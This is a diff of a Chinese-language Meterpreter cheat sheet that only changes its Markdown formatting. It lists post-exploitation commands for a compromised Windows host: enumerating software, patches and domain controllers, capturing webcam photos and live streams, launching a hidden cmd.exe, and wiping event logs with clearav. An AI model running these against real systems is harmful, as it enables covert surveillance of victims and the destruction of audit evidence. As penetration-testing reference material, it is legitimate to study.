@@ -52,19 +52,19 @@ run post/windows/gather/enum_applications查看安装软件信息
 run post/windows/gather/enum_patches查看补丁
 run post/windows/gather/enum_domain查找域控
 ```
-####shell webcam
-```
+#### shell webcam
+```shell
 webcam_list查看摄像头
 webcam_snap拍照
 webcam_stream摄像头直播
 ```
-####shell 执行文件
-```
+#### shell 执行文件
+```shell
 execute -H -i -f cmd.exe  创建新进程cmd.exe，-H不可见，-i交互
 execute -f notepad.exe
 ```
 #### 清除日志
-```
+```shell
 clearav 清除windows中的应用程序日志、系统日志、安全日志
 ```
 
